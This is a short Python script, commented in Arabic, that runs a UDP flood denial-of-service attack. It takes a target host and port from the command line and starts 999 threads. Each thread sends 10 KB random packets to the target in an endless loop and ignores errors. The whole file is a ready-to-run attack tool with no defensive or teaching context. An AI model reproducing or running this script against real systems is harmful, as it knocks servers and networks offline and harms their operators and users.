import sys
import socket
import random
import threading

host = sys.argv[1]
port = int(sys.argv[2])
threads = 999  # عدد الثريدات
packet_size = 10240  # حجم الباكيت = 10KB

def attack():
    packet = random._urandom(packet_size)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(packet, (host, port))
        except:
            pass

print(f"🚀 Starting strong UDP flood on {host}:{port} with {threads} threads...")

for _ in range(threads):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

# يبقى السكربت شغال
while True:
    pass
